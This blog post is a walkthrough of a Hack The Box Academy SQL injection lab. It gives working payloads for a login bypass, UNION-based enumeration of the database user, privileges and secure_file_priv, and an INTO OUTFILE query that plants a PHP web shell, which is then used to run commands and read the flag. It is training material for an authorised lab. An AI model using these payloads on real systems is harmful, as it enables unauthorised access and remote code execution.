---
layout: post
title:  "Hack The Box - Academy - SQL Injection Fundamentals"
description: "Master the basics of SQL injection with the Hack The Box - Academy - SQL Injection Fundamentals. Learn how to detect and exploit SQL vulnerabilities, enhancing your penetration testing skills."
date:   2024-10-03 20:25
image:  /images/htb/sql-injection/logo.png
tags:   [sqli,cbbh]
categories: [htbacademy]
---

><b>Overview:</b>
 Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
<br/>
<a href="https://academy.hackthebox.com/module/33/section/193">Introduction to SQL Injection</a>

<br/>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/33/section/177">SQL Injection Fundamentals</a><br/>
<a href="https://jacozwarts.github.io/images/htb/sql-injection/Sql_Injection_Fundamentals_Module_Cheat_Sheet.pdf">SQL Injection - Cheat Sheet</a>
<br/>


## Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

#### 1. Bypassing the Login Page with SQL Injection
Begin by visiting the web application's login page. To bypass authentication, input the following SQL injection payload in the username field:
```
' OR 1=1 -- -
```
![Login Page](/images/htb/sql-injection//login.png)
This payload effectively bypasses the login check, granting us access to the application without valid credentials.

#### 2. Testing for SQL Injection in the Search Bar
After logging in, navigate to the Payroll information section and locate the search bar. We can test for SQL injection vulnerabilities by submitting the following payload:
![Payroll Information page](/images/htb/sql-injection/payroll_info_table.png)
```
' ORDER BY 1 -- -
```
![Test for SQL Injection](/images/htb/sql-injection/orderby_test.png)
If the page loads successfully without errors, it suggests the search bar is vulnerable to SQL injection. Now, we’ll proceed to determine the number of columns in the underlying query.

#### 3. Determining the Column Count
To identify the column count for the SQL query, increment the ORDER BY number until an error is returned. When an error occurs, reduce the count by one—this gives you the number of columns in the query.
![Column Count](/images/htb/sql-injection/orderby6.png)
![Column Count](/images/htb/sql-injection/orderby6-result.png)
#### 4. Identifying the Current User
With knowledge of the column count, we can perform an In-Band Union-Based SQL injection to retrieve key information, such as the current user:
```
' UNION SELECT 1,2,user(),3,4 -- -
```
![Current User](/images/htb/sql-injection/currentuser.png)

#### 5. Checking User Privileges
To explore the privileges granted to the current user, use the following query:
```
' UNION SELECT 1, grantee, privilege_type,is_grantable,3 FROM information_schema.user_privileges
WHERE grantee="'root'@'localhost'"-- -
```
![User Privileges](/images/htb/sql-injection/user_privileges.png)
If the user has file permissions, we can proceed with attempting file operations.

#### 6. Accessing MySQL Directories
Next, check the directories accessible through MySQL by querying the secure_file_priv variable:
```
' UNION SELECT 1, variable_name, variable_value, 4,5
FROM information_schema.global_variables where
variable_name="secure_file_priv"-- -
```
![Secure File Priv](/images/htb/sql-injection/mysql_directory_access.png)

If the `SECURE_FILE_PRIV` value is empty, it indicates that file read/write operations can be performed anywhere on the system.

#### 7. Writing a Web Shell to the Server
We’ll now attempt to write a web shell to the server. Initially, try writing the shell to the default web directory:

![Webshell writing failed](/images/htb/sql-injection/write_permission_denied.png)
```
' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"", "","" into outfile '/var/www/html/shell.php'-- -
```
If permission is denied, update the file path to target a different directory, such as the dashboard directory (Payroll Information URL is /dashboard/dashboard.php):

```
' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"", "","" into outfile '/var/www/html/dashboard/shell.php'-- -
```
#### 8. Testing the Web Shell
Once the web shell is successfully written, test it by navigating to the URL:
![Testing web shell](/images/htb/sql-injection/webshell-executed.png)
```
{TARGET_IP}:{TARGET_PORT}/dashboard/shell.php?0=ls
```
This command list all files in the directory, confirming that the web shell is working.

#### 9. Retrieving the Flag
Enumerate the directories to locate the flag. Once found, use the cat command to display its contents:
```
http://{TARGET_IP}:{TARGET_PORT}/dashboard/shell.php?0=cat%20../../../../flag_cae1dadcd174.txt
```
![Flag result](/images/htb/sql-injection/flag_result.png)
<br/>
Submit the contents of the flag as the answer to complete the challenge.
<hr/>